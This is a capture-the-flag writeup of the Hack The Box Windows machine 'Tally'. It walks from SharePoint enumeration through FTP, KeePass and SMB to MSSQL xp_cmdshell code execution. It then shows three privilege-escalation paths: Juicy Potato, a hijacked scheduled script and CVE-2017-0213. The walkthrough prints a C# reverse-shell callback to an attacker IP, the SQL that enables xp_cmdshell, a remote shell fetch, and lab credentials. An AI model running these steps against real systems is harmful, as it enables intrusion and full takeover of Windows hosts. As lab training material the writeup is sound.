---
layout: post
title:  "HTB Writeup [Windows - Hard] - Tally"
published: false
---

![](/assets/Tally/Tally.png)

## Summary
- Tally is great box with multiple exploit paths for both initial access and privilege escalation.
- Intially, we found a SharePoint site on port 80 which we enumerated to find a web page with a couple of interesting bits of information.
- One: credentials for the listening FTP service.
- Two: being intel about an HTML document to be uploaded to the FTP share for review by another user.
- After successfully logging into FTP, we find an installer for a specific version of Firefox which was vulnerable to an RCE vulnerability.
- Having confirmed that the victim was using that version, we planted a malicious HTML payload but failed to get code execution due to the inconsistency of the exploit.
- Moving along, we go through the FTP share to find a KeePass database file which we crack open and gain creds for an SMB share.
- On that share, we find a custom binary that contained credentials for the `sa` user on the running MSSQL instance.
- After logging in using the `sqsh` command-line utility, we enabled the `xp_cmdshell` feature and were able to execute a reverse shell and get on the system as the `sarah` user.
- Having gained access through MSSQL, we had the `SeImpersonatePrivilege` enabled which we easily exploited using Juicy Potato to escalate our privileges to `NT AUTHORITY\System`.
- There was another unintended path for privesc using a modifiable PowerShell script on `sarah`'s desktop that was running as a scheduled task under the `Administrator` user.
- We added our payload to that script and owned the box a second way.
- A third path -which was the intended one- was to use CVE-2017-0213. We found the C++ PoC for it on GitHub but couldn't compile it at first due to an error.
- We googled it and were able to build the exploit binary. However, it only worked when we used the x86 version in an interactive process.
- We used Metasploit's multi-handler module to catch a standard shell and upgrade it to a Meterpreter.
- And later migrated to a stable interactive process where we ran the binary to escalate our privleges to `NT Authority\System` for the 3rd time.

---

## NMAP
```
PORT      STATE SERVICE            VERSION
21/tcp    open  ftp                Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http               Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-generator: Microsoft SharePoint
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was http://tally/_layouts/15/start.aspx#/default.aspx
81/tcp    open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
808/tcp   open  ccproxy-http?
1433/tcp  open  ms-sql-s           Microsoft SQL Server 2016 13.00.1601.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: TALLY
|   NetBIOS_Domain_Name: TALLY
|   NetBIOS_Computer_Name: TALLY
|   DNS_Domain_Name: TALLY
|   DNS_Computer_Name: TALLY
|_  Product_Version: 10.0.14393
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-08-23T12:49:21
|_Not valid after:  2052-08-23T12:49:21
|_ssl-date: 2022-08-23T13:01:38+00:00; 0s from scanner time.
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
15567/tcp open  http               Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|   Negotiate
|_  NTLM
| http-ntlm-info: 
|   Target_Name: TALLY
|   NetBIOS_Domain_Name: TALLY
|   NetBIOS_Computer_Name: TALLY
|   DNS_Domain_Name: TALLY
|   DNS_Computer_Name: TALLY
|_  Product_Version: 10.0.14393
|_http-title: Site doesn't have a title.
32843/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
32844/tcp open  ssl/http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2022-08-23T13:01:38+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SharePoint Services/organizationName=Microsoft/countryName=US
| Subject Alternative Name: DNS:localhost, DNS:tally
| Not valid before: 2017-09-17T22:51:16
|_Not valid after:  9999-01-01T00:00:00
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|   h2
|_  http/1.1
|_http-title: Service Unavailable
32846/tcp open  storagecraft-image StorageCraft Image Manager
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc              Microsoft Windows RPC
49665/tcp open  msrpc              Microsoft Windows RPC
49666/tcp open  msrpc              Microsoft Windows RPC
49667/tcp open  msrpc              Microsoft Windows RPC
49668/tcp open  msrpc              Microsoft Windows RPC
49669/tcp open  msrpc              Microsoft Windows RPC
49670/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| ms-sql-info: 
|   10.10.10.59:1433: 
|     Version: 
|       name: Microsoft SQL Server 2016 RTM
|       number: 13.00.1601.00
|       Product: Microsoft SQL Server 2016
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| smb2-time: 
|   date: 2022-08-23T13:00:42
|_  start_date: 2022-08-23T12:49:00
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

`nmap` gives us a bunch of information:
1. FTP port open
2. There's a Microsoft SharePoint Instance on port 80
3. MSSQL on default port 1433
4. WinRM available
5. Another HTTP port there on 15567

## Quick FTP Check
Before checking SharePoint, we pass by FTP to see if it's offering any freebies

![](/assets/Tally/no-ftp-anon.jpg)

anonymous login wasn't allowed.

## Enumerating Sharepoint
Checking the website, we get redirected to `/_layouts/15/start.aspx#/default.aspx`

![](/assets/Tally/sharepoint-home-page.jpg)

To enumerate SharePoint, we needed a wordlist for its web directories.

This [one](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/sharepoint.txt) from the Seclists repo was good.

We launched `gobuster` specifying the `--timeout` flag to 60 seconds since SharePoint was very slow :/

![](/assets/Tally/gobuster.jpg)

Out of the many pages, one was special: `/_layouts/15/viewlsts.aspx`

![](/assets/Tally/sharepoint-file-list.jpg)

The "Documents" list had something interesting

![](/assets/Tally/documents-sub-site.jpg)

When we opened the file we found ourselves a password :)

![](/assets/Tally/ftp-details-document.jpg)

the "Site Pages" list also had something

![](/assets/Tally/site-pages-list.jpg)

a lot of information here

![](/assets/Tally/migration-update-note.jpg)

- we got 4 usernames: `rahul`, `ftp_user`, `sarah` & `tim`
- we now know `rahul` is expected to put an `index.html` file in the "Intranet" folder which either `sarah` or `tim` will open.

This is could very well be a client-side attack vector.

but let's first test those credentials against both SMB and FTP

![](/assets/Tally/smb-worked-for-ftp-user.jpg)

SMB worked, but there were no permissions over any shares.

![](/assets/Tally/no-shares-available.jpg)

Enumerating local users with the `--users` flag failed.

![](/assets/Tally/user-enumeration.jpg)

But RID brute-forcing worked and got us every user on the box. They might come in handy.

![](/assets/Tally/user-enumeration-rid-brute.jpg)

But that was it for SMB.

We then tested all our creds with FTP and found the `ftp_user` valid as expected.

![](/assets/Tally/ftp-access-confirmed-hydra.jpg)

## FTP Share Enumeration

![](/assets/Tally/ftp-directories.jpg)

After browsing the share and finding a lot of files/folders there, we decided to download it for speed and to leverage tools like `find` for search and what not.

we can do so with `wget`'s `-m` flag (for mirroring).

```bash
wget -m ftp://ftp_user:'UTDRSCH53c"$6hys'@tally
```

while browsing the contents, we found a KeePass file in `tim`'s folder.

![](/assets/Tally/keepass-file-found.jpg)

we converted it to a hash using `keepass2john` and cracked it.

![](/assets/Tally/keepass-pass-cracked.jpg)

we carried the .kdbx file over to our windows VM along with the KeePass program files that were on the share then ran the application.

Inside, we found a password for a share called ACCT (we saw that earlier when enumerating SMB)

![](/assets/Tally/keepass-passwords.jpg)

and another password that looks for a cisco product.

![](/assets/Tally/cisco-password.jpg)

Automatically, we shuffle the usernames/passwords and spray

![](/assets/Tally/spray-and-finance-share-access.jpg)

The creds for the `finance` user worked and we got access to the ACCT share.

![](/assets/Tally/finance-share-access.jpg)


## Going through SMB
We mounted the share and started browsing.

```bash
mount -t cifs -o 'username=Finance,password=Acc0unting' //tally/ACCT finance-smb/
```

![](/assets/Tally/mounting-the-smb-share.jpg)

A custom binary called `tester.exe` was in `/zz_Migration/Binaries/New folder`

![](/assets/Tally/tester-exe-found.jpg)

when running `strings` against it, we found creds inside:

![](/assets/Tally/db-password-found.jpg)

## Getting a shell through MSSQL
The creds worked when we connected to MSSQL on port 1433.

However, to execute commands, we needed to enable the `xp_cmdshell` feature which was initially blocked.

At first, it wouldn't get enabled for being set as an "advanced option".

so we reconfigured the shell to "show advanced options" and could then re-enable `xp_cmdshell` using the commands below:

```sql
exec sp_configure 'show advanced options', '1'
reconfigure
exec sp_configure 'xp_cmdshell', '1'
reconfigure
xp_cmdshell 'whoami'
```

After running the `whoami` command, we find ourselves executing code as the `sarah` user.

![](/assets/Tally/enabling-xp-cmd-shell-mssql.jpg)

Because, over time, the `xp_cmdshell` option kept getting automatically disabled, we set the MSSQL commands in a file for a bit of automation.

We added the code to re-enable it and do a PowerShell web request to execute a [Nishang Reverse Shell](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) hosted on our server.

![](/assets/Tally/shell-as-sarah.jpg)

We were now inside as `sarah`

## Privesc Path #1: Abusing the SeImpersonatePrivilege

Since we got in through MSSQL, we had the `SeImpersonatePrivilege` enabled.

![](/assets/Tally/se-impersonate-enabled.jpg)

That's ripe for exploitation using the well-known Juicy Potato exploit.

we download the binary from [Github](https://github.com/ohpe/juicy-potato/releases/tag/v0.1) and call it `jp.exe`

That exploit always gave me the best results when used with a single executable rather than passing arguments.

Our choice is going to be a [C# reverse shell](https://gist.github.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc)

because that shell is also good for bypassing Windows Defender which was enabled and hinted for in the `todo.txt` file on `sarah`'s desktop:

![](/assets/Tally/windows-defender-hint.jpg)

we can confirm that with:

```powershell
Get-MpComputerStatus
```

![](/assets/Tally/real-time-protection-enabled.jpg)

After getting the shell, we modify it with our IP and port
```C#
// SNIP //
TcpClient client = new TcpClient("10.10.16.4", 9001)
// SNIP //
```

We then compile on the victim machine using the native .NET framework compiler
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:rev.exe C:\Users\sarah\rev.cs
```

Note: the compilation errors weren't serious here

![](/assets/Tally/compilin-csharp-rev.jpg)

after running Juicy Potato with the shell to execute, it gave us back a reverse shell as `nt authority\system`

```
jp.exe -l 1337 -p c:\users\sarah\rev.exe -t *
```

![](/assets/Tally/juicy-potato-to-system-rev-shell.jpg)


## Privesc Path #2: Modifying the Scheduled PowerShell Script
Also on `sarah`'s desktop, there was a Powershell script called `SPBestWarmup.ps1` and another XML file with the same name `SPBestWarmup.xml`

![](/assets/Tally/spwarmup-scripts.jpg)

when looking within at the XML file, we notice something:

![](/assets/Tally/spwarmup-xml-contents.jpg)

these options indicate that this script is part of a scheduled task.

To check if we can exploit this, We run a `Get-ACL` to find our permissions.

```powershell
Get-ACL .\SPBestWarmup.ps1 | Select -Expand AccessToString
```

![](/assets/Tally/write-access-to-script.jpg)

We have full control!

We went ahead and added a reverse shell to that script right away.

However, it was configured to run every hour. so we had to wait for it :S

But eventually, we received a shell as `Administrator`

![](/assets/Tally/shell-as-administrator.jpg)

## Privesc Path #3: CVE-2017-0213
After taking over the machine using the above two ways, and looking at the [Official Writeup](https://app.hackthebox.com/machines/Tally/walkthroughs), I found that this was the intended path.

The [source code](https://github.com/SecWiki/windows-kernel-exploits/blob/master/CVE-2017-0213/CVE-2017-0213.cpp) needed to be compiled in Visual Studio to get the binary.

without any modifications, we get a type error:

![](/assets/Tally/eop-cve-compile-error.jpg)

On Google, we query with the error as well as the variable name to get accurate results

![](/assets/Tally/google-stackoverflow.jpg)

By coincidence, the first result happened to be for the exact exploit. Here was the solution:

![](/assets/Tally/exploit-error-fix.jpg)

After applying the fix, we edited the `cmdline` variable and inserted our shell's path instead.

That's because the normal exploit behavior was to run a `cmd.exe` which is just a Proof of Concept

We make sure to select the `x86` process architecture as the 64-bit version doesn't work :/

![](/assets/Tally/cpp-build-succeeded.jpg)

Running the exploit at this point didn't work.

That's because it had to be run as an "interactive process".

To proceed, we must get a Meterpreter shell.

We can get that by first starting a Metasploit handler on our Kali box.

On Tally, we use PowerShell's `start-process` command with the `rev.exe` binary to fork from our shell and connect back to our listener.

Once we catch the shell, we can upgrade it using the `sessions -u` command:

![](/assets/Tally/upgrade-to-meterpreter.jpg)

Now that we have a Meterpreter shell, becoming an "interactive process" can be easily achieved by migrating to a process with session ID = 1

we choose `svchost.exe` because it ought to be a stable process.

![](/assets/Tally/migration-done.jpg)

After migrating, we drop into a cmd shell with the `shell` command and launch the exploit. And get a connection back as `nt authority\system`

![](/assets/Tally/cve-eop-worked.jpg)

Very difficult. But pretty sweet :D

## Rabbit Hole: Chasing the Firefox Exploit

when we go into the `Intranet` folder (mentioned in the note on SharePoint), we find a sub-folder called `binaries`.

It contained a certain version of Firefox.

![](/assets/Tally/3-exploits-for-vuln-firefox.jpg)

When using `searchsploit`, we find a couple of exploits for it.

![](/assets/Tally/firefox-searchsploit.jpg)

Our theory has a few parts:

- if we found this installer, that means that there's a high chance it's being used in the environment.
- And since either `sarah` or `tim` will be checking an `index.html` from `rahul`, they will probably use that version of Firefox to do so.
- And that's where the exploit should come in.

To confirm our theory and before spending any time on this path, we will upload an `index.html` to the `intranet` folder setting it up to redirect to our kali.

![](/assets/Tally/index-html-redirect.jpg)

We have to use the binary mode to avoid any corruption.

![](/assets/Tally/ftp-binary-upload.jpg)

After a couple of minutes, we get our confirmation through the `user-agent` HTTP header.

![](/assets/Tally/victim-firefox-version-confirmed.jpg)

Knowing that Metasploit modules are usually well-developed, we checked it first. Sadly, it wasn't matching our target.

![](/assets/Tally/MSF-firefox-exploit-no-match.jpg)

We then turned to the one with the exact version match.

![](/assets/Tally/edb-firefox-exploit-verified.jpg)

it was verified on EDB. and it did work well in testing. But only with `calc.exe` :/

![](/assets/Tally/calc-works-ff-exploit.jpg)

no matter how many shellcodes we generated using `sc2asmjs.py`. None worked.

![](/assets/Tally/ff-exploit-instructions.jpg)

the 3rd version on `searchsploit` did work. But after many many tries.

you can find that in the [Official Writeup](https://app.hackthebox.com/machines/Tally/walkthroughs)